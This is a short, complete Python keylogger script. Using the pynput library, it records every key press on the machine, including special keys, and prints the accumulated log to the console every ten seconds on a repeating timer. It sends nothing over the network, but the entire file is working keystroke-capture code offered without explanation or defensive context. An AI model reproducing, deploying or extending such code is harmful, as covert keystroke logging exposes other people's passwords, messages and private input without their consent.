#!/usr/bin/env python
import pynput.keyboard
import threading

class Keylogger:
    def __init__(self):
        self.log = ""

    def use_keys(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            else:
                self.log += " [" + str(key) + "] "
    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(10, self.report)
        timer.start()

    def start(self):
        key_rec = pynput.keyboard.Listener(on_press= self.use_keys)
        with key_rec:
            self.report()
            key_rec.join()

logger = Keylogger()
logger.start()